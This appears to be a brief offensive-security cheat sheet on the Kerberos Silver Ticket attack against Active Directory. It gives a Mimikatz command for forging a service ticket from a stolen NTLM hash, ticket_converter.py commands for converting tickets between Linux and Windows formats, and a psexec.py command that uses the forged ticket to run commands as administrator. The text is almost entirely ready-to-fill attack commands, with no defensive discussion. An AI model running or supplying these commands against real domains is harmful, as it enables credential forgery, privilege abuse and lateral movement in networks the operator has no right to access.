# Silver Ticket Attack
Requires a service account password or NTLM hash, to forge a TGS. Can be avoided with PAC enabled?

impacket ticketer.py

## Create a ticket for the service with Mimikatz
`kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET/HOST.DOMAIN.FQDN> /rc4:<NTLM_MACHINE> /service:<SERICE>`

## Swapping tickets between Linux-Windows
`python ticket_converter.py <LINUX.ccache> <WINDOWS.kirbi>`
`python ticket_converter.py <WINDOWS.kirbi> <LINUX.ccache>`

## Then use the same steps as a Golden ticket with Mimikatz
`export KRB5CCNAME=/home/user/ticket.ccache`
`psexec.py -k -no-pass -dc-ip <IP> AD/administrator@192.168.1.100`